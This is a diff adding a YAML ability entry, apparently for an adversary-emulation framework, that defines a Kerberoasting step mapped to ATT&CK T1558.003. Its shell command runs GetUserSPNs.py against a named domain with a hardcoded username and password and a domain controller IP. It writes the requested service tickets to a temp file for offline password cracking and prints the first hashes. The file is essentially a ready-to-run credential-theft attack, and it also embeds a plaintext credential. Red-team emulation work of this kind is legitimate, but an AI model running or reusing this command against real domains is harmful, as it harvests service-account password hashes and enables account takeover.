@@ -1,0 +1,16 @@
+- id: ca05-kerberoast
+  name: Kerberoasting - SPN Ticket Request
+  description: Request Kerberos service tickets for SPN accounts and save for cracking
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: Steal or Forge Kerberos Tickets - Kerberoasting
+  platforms:
+    linux:
+      sh:
+        command: |
+          GetUserSPNs.py cyberstrike.mil/ansible:abc@123 -dc-ip 10.0.20.101 -outputfile /tmp/kerberoast.txt 2>/dev/null; echo "TGS tickets: $(grep -c 'krb5tgs' /tmp/kerberoast.txt 2>/dev/null)"; head -3 /tmp/kerberoast.txt 2>/dev/null
+        cleanup: |
+          rm -f /tmp/kerberoast.txt
+  singleton: false
+  repeatable: false
